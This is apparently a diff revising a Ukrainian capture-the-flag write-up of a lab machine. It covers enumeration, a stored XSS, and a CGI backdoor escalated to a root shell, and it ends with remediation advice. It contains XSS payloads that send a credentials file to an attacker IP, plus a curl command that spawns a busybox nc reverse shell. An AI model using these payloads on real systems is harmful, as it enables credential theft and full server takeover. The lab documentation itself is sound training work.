@@ -3,18 +3,20 @@
 
 Складність: Medium
 
-Ціль:
+Ціль: 10.113.143.191
 
 ## 1. Розвідка (Reconnaissance & Enumeration)
 
 ### 1.1. Сканування портів (Nmap):
-
+   Проводимо первинне сканування цільової машини.
 ```bash
 └─$ sudo nmap -sV -sC -oN nmap_scan.txt 10.113.143.191
 ```
 
 ![nmap](./img/nmap.png)
 
+### 1.2. FTP Enumeration
+   Підключаємось до `FTP` та переглядаємо доступні файли.
 ```bash
 └─$ ftp 10.113.143.191
 ftp> ls -lah
@@ -31,12 +33,18 @@ Hey I just removed the old user mike because that account was compromised and fo
 - admin
 ```
 
+### 1.3. Веб-розвідка
+   Виконуємо пошук прихованих директорій.
 ```bash
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.113.143.191/ -k -t 50 -x html,txt,php
 ```
 
 ![gobuster](./img/gobuster.png)
 
+## 2. Початковий доступ (Initial Access)
+
+### 2.1. Аналіз Stored XSS
+   Спочатку перевіряємо поле коментаря.
 ```html
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
@@ -46,27 +54,31 @@ Hey I just removed the old user mike because that account was compromised and fo
 <svg onload=alert(1)>
 ```
 
+   Результат - HTML-теги екрануються.
+
 ![comments_xss_test](./img/comments_xss_test.png)
 
 ![comments_xss_test_html](./img/comments_xss_test_html.png)
 
-У коментарях фільтруються символи `<` та `>`. Перевіряємо далі ім'я користувача 
+   Далі перевіряємо поле імені користувача.
 
 ![name_xss_test_1](./img/name_xss_test_1.PNG)
 
-Після надсилання коментаря, відпраював XSS.
+   Після відправлення коментаря JavaScript успішно виконується.
 
 ![name_xss_test_2](./img/name_xss_test_2.PNG)
 
 ![name_xss_test_html](./img/name_xss_test_html.PNG)
 
+### 2.2. Отримання доступу до локального файлу
+   Першою спробою було виконати:
 ```html
-<script>document.body.innerHTML='XSS'</script>
+fetch('/dir/pass.txt')
 ```
 
-![name_xss_payload_test](./img/name_xss_payload_test.PNG)
-![name_xss_payload_test2](./img/name_xss_payload_test2.PNG)
+  Відповідь `403 Forbidden`.
 
+   Подальший аналіз показує, що необхідно виконувати код від імені адміністратора.     
 ```html
 <script>fetch('/dir/pass.txt').then(r=>r.text()).then(t=>fetch('http://192.168.130.250:4444/?data='+btoa(t)))</script>
 ```
@@ -90,22 +102,19 @@ Hey I just removed the old user mike because that account was compromised and fo
 <script>fetch('http://127.0.0.1/dir/pass.txt').then(r=>r.text()).then(t=>fetch('http://192.168.130.250:4444/?data='+btoa(t)))</script>
 ```
 
-Нічого не відбулося.Перевіряю далі.
-
 ```html
 <script>fetch('http://127.0.0.1/dir/pass.txt').then(r=>alert(r.status)).catch(e=>alert(e))</script>
 ```
 
 ![xss_fetch_error_.PNG](./img/xss_fetch_error_.PNG)
 
-Підготуємо пейлоад для віпрацювання свого скрипта
+Підготуємо пейлоад для виконання зовнішнього JavaScript, логінимось та лишаємо коментар
 
 ```html
 <script src="http://192.168.130.250:4444/lol.js"></script>
 ```
 
-логінимось та лишаємо коментар
-
+   Вміст `lol.js`:
 ```js
 fetch('/dir/pass.txt')
   .then(r => r.text())
@@ -114,35 +123,31 @@ fetch('/dir/pass.txt')
   });
 ```
 
+   На атакуючій машині запускається HTTP-сервер: 
+```bash
+python3 -m http.server 4444
+```
+
+   Після відкриття сторінки адміністратором отримуємо вміст `/dir/pass.txt`.
+
 ![xss_payload_result.PNG](./img/xss_payload_result.PNG)
 
-Логінимся по `ssh` та забираємо `user.txt`.
+### 2.3. SSH-доступ
+   Використовуючи отримані облікові дані, підключаємось по SSH. Після входу отримуємо прапор користувача.
 
 ![user_txt.PNG](./img/user_txt.PNG)
 
+## 3. Аналіз системи
+
+### 3.1. Перевірка sudo
+   Перевіряємо доступні sudo-команди.
+   
 ![sudo-l.PNG](./img/sudo-l.PNG)
 
-```bash
-jack@ubuntu:~$ sudo iptables -L -n -v --line-numbers
-Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
-num   pkts bytes target     prot opt in     out     source               destination         
-1      794 47640 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:41312
-2    28434 3220K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           
-3     888K  134M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW,RELATED,ESTABLISHED
-4        0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22
-5        0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80
-6        0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
-7        0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
-8        6   240 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           
-
-Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
-num   pkts bytes target     prot opt in     out     source               destination         
-
-Chain OUTPUT (policy ACCEPT 29228 packets, 3267K bytes)
-num   pkts bytes target     prot opt in     out     source               destination         
-1     905K  413M ACCEPT     all  --  *      eth0    0.0.0.0/0            0.0.0.0/0
-```
-
+   Користувач має право запускати: `/usr/sbin/iptables`.
+   
+### 3.2. Пошук цікавих файлів
+   У каталозі `/opt` знаходимо:
 ```bash
 jack@ubuntu:~$ ls -lah /opt
 total 40K
@@ -154,58 +159,35 @@ jack@ubuntu:~$ cat /opt/urgent.txt
 Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
 ```
 
-Також забираю собі `capture.pcap` та досліджую за допомогою `Wireshark`.
+   Файл `urgent.txt` повідомляє:
+* сервер був скомпрометований;
+* у `/usr/lib/cgi-bin` залишився бекдор;
+* доступ до нього тимчасово заблоковано через `iptables`;
+* необхідно проаналізувати мережевий дамп.
 
+## 4. Аналіз мережевого дампа
+
+### 4.1. Дослідження Wireshark
+   Відкриваємо `capture.pcap`. Через `Statistics` → `Protocol Hierarchy` бачимо, що весь корисний трафік передається через `TLS`.
+   
 ![wireshark statistics](./img/wireshark.PNG)
 
-Трафік зашифрований. Шукаємо як його розшифрувати.
+   Звичайний `Follow TCP Stream` не дозволяє переглянути HTTP-запити.
 
+### 4.2. Пошук TLS-ключа
+   Досліджуємо конфігурацію `Apache`.
 ```bash
 jack@ubuntu:/opt$ find /etc/apache2 -type f
 /etc/apache2/magic
 /etc/apache2/certs/apache.key
 /etc/apache2/certs/apache-certificate.crt
-/etc/apache2/conf-available/charset.conf
-/etc/apache2/conf-available/localized-error-pages.conf
-/etc/apache2/conf-available/serve-cgi-bin.conf
-/etc/apache2/conf-available/other-vhosts-access-log.conf
 ...
 ```
 
+   У конфігурації `VirtualHost` підтверджується використання знайденого ключа.
 ```bash
 jack@ubuntu:/opt$ cat /etc/apache2/sites-enabled/*
-<VirtualHost *:80>
-        # The ServerName directive sets the request scheme, hostname and port that
-        # the server uses to identify itself. This is used when creating
-        # redirection URLs. In the context of virtual hosts, the ServerName
-        # specifies what hostname must appear in the request's Host: header to
-        # match this virtual host. For the default virtual host (this file) this
-        # value is not decisive as it is used as a last resort host regardless.
-        # However, you must set it for any further virtual host explicitly.
-        #ServerName www.example.com
-
-        ServerAdmin webmaster@localhost
-        DocumentRoot /var/www/html
-        ScriptAlias "/cgi-bin/" "/usr/local/apache2/cgi-bin/"
-        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
-        # error, crit, alert, emerg.
-        # It is also possible to configure the loglevel for particular
-        # modules, e.g.
-        #LogLevel info ssl:warn
-
-        #ErrorLog ${APACHE_LOG_DIR}/error.log
-        #CustomLog ${APACHE_LOG_DIR}/access.log combined
-        ErrorLog /dev/null
-
-        # For most configuration files from conf-available/, which are
-        # enabled or disabled at a global level, it is possible to
-        # include a line for only one particular virtual host. For example the
-        # following line enables the CGI configuration for this host only
-        # after it has been globally disabled with "a2disconf".
-        #Include conf-available/serve-cgi-bin.conf
-</VirtualHost>
-
-# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+...
 Listen 41312
 <VirtualHost *:41312>
         ServerName www.example.com
@@ -230,14 +212,22 @@ Listen 41312
 </VirtualHost>
 ```
 
+   Копіюємо його на локальну машину.
 ```bash
 └─$ scp jack@10.113.143.191:/etc/apache2/certs/apache.key .
 ```
 
-Edit → Preferences → Protocols → TLS.
+   Імпортуємо ключ у `Wireshark`: **Edit** → **Preferences** → **Protocols** → **TLS**. Після цього TLS-трафік успішно розшифровується.
 
+### 4.3. Виявлення бекдора
+   У розшифрованому трафіку видно запити, до CGI-скрипта `5UP3r53Cr37.py` з параметрами `key=`, `iv=` та `cmd=`, що дозволяє виконувати довільні команди.
+   
 ![wireshark_enc.PNG](./img/wireshark_enc.PNG)
 
+## 5. Підвищення привілеїв (Privilege Escalation)
+
+### 5.1. Відкриття прихованого сервісу
+   Переглядаємо правила `iptables`. Видаляємо правило, яке блокує порт `41312`.
 ```bash
 jack@ubuntu:/opt$ sudo iptables -D INPUT 1
 [sudo] password for jack: 
@@ -260,23 +250,18 @@ target     prot opt source               destination
 ACCEPT     all  --  anywhere             anywhere
 ```
 
+   Після цього сервіс стає доступним.
 ```bash
 └─$ sudo nmap -sV -p41312 10.113.143.191                   
-
-]]Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 22:37 +0100
-Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
-Ping Scan Timing: About 100.00% done; ETC: 22:37 (0:00:00 remaining)
-Nmap scan report for 10.113.143.191
-Host is up (0.038s latency).
-
+...
 PORT      STATE SERVICE VERSION
 41312/tcp open  http    Apache httpd 2.4.41
 Service Info: Host: www.example.com
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds
+...
 ```
 
+### 5.2. Використання CGI-бекдора
+   Перевіряємо виконання команд.   
 ```bash
 └─$ curl -k 'https://10.113.143.191:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
 
@@ -284,6 +269,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds
 <h2>
 ```
 
+   Далі перевіряємо `sudo`.
 ```bash
 └─$ curl -k 'https://10.113.143.191:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20-l'
 
@@ -295,6 +281,8 @@ User www-data may run the following commands on ubuntu:
 <h2>
 ```
 
+### 5.3. Отримання Root Shell
+   Запускаємо `nc` та виконуємо реверс-шелл через CGI.
 ```bash
 └─$ curl -k 'https://10.113.143.191:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20busybox%20nc%20192.168.130.250%204545%20-e%20%2Fbin%2Fsh'
 └─$ nc -lvnp 4545       
@@ -305,5 +293,113 @@ uid=0(root) gid=0(root) groups=0(root)
 root
 ```
 
+   Забираємо фінальний прапор:
+
 ![root_txt.PNG](./img/root_txt.PNG)
 
+## Висновки та рекомендації
+
+Під час аналізу машини було виявлено низку критичних недоліків безпеки, які в сукупності дозволили отримати повний контроль над системою.
+
+### Виявлені проблеми
+- Наявність **Stored XSS** у полі імені користувача дозволила виконувати довільний JavaScript у браузері адміністратора.
+- Облікові дані користувача зберігалися у локальному файлі `/dir/pass.txt`, доступ до якого був отриманий через XSS.
+- Користувач `jack` мав право виконувати `iptables` через `sudo`, що дозволило відкрити прихований сервіс.
+- Приватний TLS-ключ сервера був доступний локальному користувачу, що дало можливість розшифрувати мережевий дамп.
+- У системі залишився прихований CGI-бекдор, доступ до якого блокувався лише правилом `iptables`, а не був видалений.
+- Бекдор дозволяв виконувати довільні команди на сервері.
+- Користувач `www-data` мав привілей `NOPASSWD: ALL`, що призвело до миттєвого отримання прав `root`.
+
+### Рекомендації
+- Усунути **Stored XSS** шляхом коректної валідації та екранування користувацького вводу.
+- Не зберігати паролі або інші секрети у відкритому вигляді у веб-доступних або локальних файлах.
+- Видаляти шкідливі файли після компрометації, а не покладатися лише на правила `iptables`.
+- Обмежити доступ до приватних TLS-ключів лише процесам, яким вони необхідні.
+- Дотримуватись принципу найменших привілеїв (Least Privilege) та переглянути права користувачів у `sudoers`.
+- Регулярно перевіряти сервер на наявність сторонніх CGI-скриптів, бекдорів і невідомих сервісів.
+- Використовувати централізований моніторинг журналів та контроль цілісності файлів для своєчасного виявлення компрометації.
+
+## Блок-схема
+
+```
+                    +----------------------+
+                    |      Nmap Scan       |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    |   FTP Enumeration    |
+                    |     update.txt        |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | Gobuster Enumeration |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    |  Stored XSS (Name)   |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | Admin opens comment  |
+                    |  JS executes         |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | Exfiltration of      |
+                    | /dir/pass.txt        |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | SSH as jack          |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | sudo iptables        |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | capture.pcap         |
+                    | Apache TLS Key       |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | Decrypt TLS Traffic  |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | Discover CGI Backdoor|
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | Remove iptables rule |
+                    | Open port 41312      |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | RCE via CGI          |
+                    | cmd=                 |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    | sudo -l (www-data)   |
+                    | NOPASSWD: ALL        |
+                    +----------+-----------+
+                               |
+                               v
+                    +----------------------+
+                    |      ROOT SHELL      |
+                    +----------------------+
+```
